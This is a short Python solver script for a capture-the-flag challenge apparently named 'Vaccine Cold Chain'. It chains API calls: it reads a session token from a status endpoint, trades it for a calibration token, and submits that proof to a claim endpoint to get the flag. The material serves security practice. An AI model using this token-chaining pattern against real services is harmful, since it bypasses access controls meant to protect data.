#!/usr/bin/env python3
"""Recover a flag from a live Vaccine Cold Chain runtime session."""

from __future__ import annotations

import argparse
import json
import re
from urllib.parse import urlencode
from urllib.request import Request, urlopen


API = "https://hackforachangeruntime.vercel.app/api/vaccine-cold-chain"
CLAIM = "https://vgwukffsjudbybdeuodn.supabase.co/functions/v1/claim-runtime-flag"
FLAG_RE = re.compile(r"^[A-Za-z0-9_]+\{[^\r\n}]+\}$")


def request_json(request: Request | str) -> dict:
    with urlopen(request, timeout=15) as response:
        return json.load(response)


def solve(seed: str, launch_token: str) -> str:
    """Get a session token, exchange it for a proof, and claim the candidate."""
    status = request_json(f"{API}?{urlencode({'seed': seed, 'action': 'status'})}")
    report = request_json(Request(
        f"{API}?{urlencode({'seed': seed, 'action': 'generate_report'})}",
        data=json.dumps({"session_token": status["session_token"]}).encode(),
        headers={"Content-Type": "application/json"}, method="POST",
    ))
    claim = request_json(Request(
        CLAIM,
        data=json.dumps({"token": launch_token, "proof": report["calibration_token"], "slug": "vaccine-cold-chain"}).encode(),
        headers={"Content-Type": "application/json", "Authorization": f"Bearer {launch_token}"},
        method="POST",
    ))
    flag = claim.get("flag") or claim.get("data", {}).get("flag")
    if not isinstance(flag, str) or not FLAG_RE.fullmatch(flag):
        raise ValueError("claim endpoint returned no valid flag")
    return flag


def main() -> int:
    parser = argparse.ArgumentParser()
    parser.add_argument("--seed", required=True)
    parser.add_argument("--launch-token", required=True)
    args = parser.parse_args()
    print(solve(args.seed, args.launch_token))
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
